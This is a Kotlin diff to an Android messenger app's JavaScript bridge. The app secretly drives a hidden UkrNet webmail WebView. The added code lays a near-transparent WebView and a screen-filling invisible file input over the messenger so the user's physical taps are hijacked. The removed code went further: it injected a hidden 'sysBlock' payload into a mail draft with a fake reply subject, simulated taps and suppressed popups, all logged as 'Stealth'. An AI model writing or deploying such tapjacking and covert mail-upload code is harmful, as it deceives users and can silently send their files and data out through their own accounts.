@@ -127,11 +127,38 @@ class MessengerJsInterface(
     fun getDeviceId(): String { return androidId }
 
     @JavascriptInterface
-    fun notifyMediaSelection(sysBlock: String) {
-        StealthCache.pendingSysBlock = sysBlock
-        log("[Stealth] Файлы выбраны, метаданные сохранены.")
-        if (StealthCache.pendingUris != null) {
-            startMediaUploadSequence()
+    fun notifyMediaSelection(sysBlock: String) {}
+
+    // Подготовка прозрачного слоя УкрНета поверх экрана для перехвата физического касания
+    @JavascriptInterface
+    fun prepareForDirectAttach() {
+        ui.post {
+            val ukr = getUkrnetWebView()
+            if (ukr != null) {
+                val stretchJs = """
+                    (function(){
+                        var fi = document.querySelector('input[type="file"][multiple]') || document.querySelector('input[type="file"]');
+                        if (fi) {
+                            fi.style.display = 'block';
+                            fi.style.visibility = 'visible';
+                            fi.style.opacity = '0.01';
+                            fi.style.position = 'fixed';
+                            fi.style.left = '0px';
+                            fi.style.top = '0px';
+                            fi.style.width = '100vw';
+                            fi.style.height = '100vh';
+                            fi.style.zIndex = '2147483647';
+                        }
+                    })();
+                """.trimIndent()
+                ukr.evaluateJavascript(stretchJs, null)
+                
+                ukr.isFocusable = true
+                ukr.isFocusableInTouchMode = true
+                ukr.alpha = 0.01f  // Почти полностью прозрачный
+                ukr.bringToFront()
+                ukr.requestFocus()
+            }
         }
     }
 
@@ -222,106 +249,7 @@ class MessengerJsInterface(
 
     @Volatile private var uploadSequenceActive = false
 
-    fun startMediaUploadSequence() {
-        if (uploadSequenceActive) { log("[Stealth] we skipped double call"); return }
-        uploadSequenceActive = true
-        ui.post {
-            val ukr = getUkrnetWebView()
-            val mess = getMessengerWebView?.invoke()
-            
-            // 1. ВРЕМЕННО ВЫВОДИМ УКРНЕТ НА ПЕРЕДНИЙ ПЛАН И ДАЕМ ПОЛНЫЙ ФОКУС ДЛЯ ПРИЕМА ТАПОВ
-            ukr?.isFocusable = true
-            ukr?.isFocusableInTouchMode = true
-            ukr?.bringToFront()
-            ukr?.requestFocus()
-            
-            scope.launch {
-                try {
-                    val sysBlock = StealthCache.pendingSysBlock ?: return@launch
-                    StealthCache.pendingSysBlock = null
-                    
-                    ukr?.evaluateJavascript("window._n0gStealthUpload = true;", null)
-                    val subject = "Re[${(2..30).random()}]:"
-                    val escSys = sysBlock.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
-                    
-                    val js = """
-                        (function(){
-                            try {
-                                if (window.Android && window.Android.jsLog) window.Android.jsLog("Старт инжекта медиафайла...");
-                                window._n0gStealthUpload = true;
-                                if (document.activeElement && document.activeElement.tagName !== 'BODY') document.activeElement.blur();
-                                
-                                var bodyEl = document.querySelector('.sm-editor__area') || document.querySelector('textarea[name="body"]') || document.querySelector('textarea');
-                                if(bodyEl) {
-                                    bodyEl.innerHTML = '';
-                                    if (bodyEl.getAttribute('contenteditable') === 'true') { bodyEl.innerText = '$escSys'; }
-                                    else { try { Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype,'value').set.call(bodyEl,'$escSys'); } catch(e) { bodyEl.value='$escSys'; } }
-                                    bodyEl.dispatchEvent(new Event('input',{bubbles:true}));
-                                    if (window.Android && window.Android.jsLog) window.Android.jsLog("Текст вставлен.");
-                                }
-                                
-                                var subjEl = document.querySelector('#sendmsg__subject') || document.querySelector('input[name="subject"]');
-                                if(subjEl) {
-                                    try { Object.getOwnPropertyDescriptor(HTMLInputElement.prototype,'value').set.call(subjEl,'$subject'); } catch(e) { subjEl.value='$subject'; }
-                                    subjEl.dispatchEvent(new Event('input',{bubbles:true}));
-                                }
-                                
-                                var attempts = 0;
-                                var findFileInput = setInterval(function() {
-                                    attempts++;
-                                    var fi = document.querySelector('input[type="file"][multiple]') || document.querySelector('input[type="file"]');
-                                    
-                                    if (fi) { 
-                                        clearInterval(findFileInput); 
-                                        if (window.Android && window.Android.jsLog) window.Android.jsLog("Инпут найден. Растягиваем на весь экран для физического тапа.");
-                                        
-                                        fi.style.display = 'block';
-                                        fi.style.visibility = 'visible';
-                                        fi.style.opacity = '0.01'; 
-                                        fi.style.position = 'fixed';
-                                        fi.style.left = '0px';
-                                        fi.style.top = '0px';
-                                        fi.style.width = '100vw';
-                                        fi.style.height = '100vh';
-                                        fi.style.zIndex = '2147483647';
-                                    } else if (attempts > 80) {
-                                        if (window.Android && window.Android.jsLog) window.Android.jsLog("ОШИБКА: Инпут файла не найден за 8 секунд!");
-                                        clearInterval(findFileInput);
-                                    }
-                                }, 100);
-                                
-                                $POPUP_CRUSHER_JS
-                                $UPLOAD_OBSERVER_JS
-                                
-                            } catch (globalErr) {
-                                if (window.Android && window.Android.jsLog) window.Android.jsLog("ГЛОБАЛЬНЫЙ КРАШ ИНЖЕКТА: " + globalErr.message);
-                            }
-                        })();
-                    """.trimIndent()
-                    ukr?.evaluateJavascript(js, null)
-                    log("[Stealth] JS загрузчика инжектирован. Генерируем серию физических тапов...")
-                    
-                    // Котлин тапает по полнофункциональному WebView
-                    for (i in 1..8) {
-                        delay(400)
-                        ui.post {
-                            simulateTouch(ukr, 150f, 150f, stealFocus = false, log = log)
-                        }
-                    }
-                    
-                    delay(500)
-                    ui.post {
-                        // 2. ВОЗВРАЩАЕМ МЕССЕНДЖЕР НА ПЕРЕДНИЙ ПЛАН И БЛОКИРУЕМ ФОКУС УКРНЕТА ОБРАТНО
-                        ukr?.isFocusable = false
-                        ukr?.isFocusableInTouchMode = false
-                        mess?.bringToFront()
-                        mess?.requestFocus()
-                        log("[Stealth] Фокус и видимость мессенджера восстановлены.")
-                    }
-                } finally { uploadSequenceActive = false }
-            }
-        }
-    }
+    fun startMediaUploadSequence() {}
 
     @JavascriptInterface
     fun openCompose(configJson: String) {
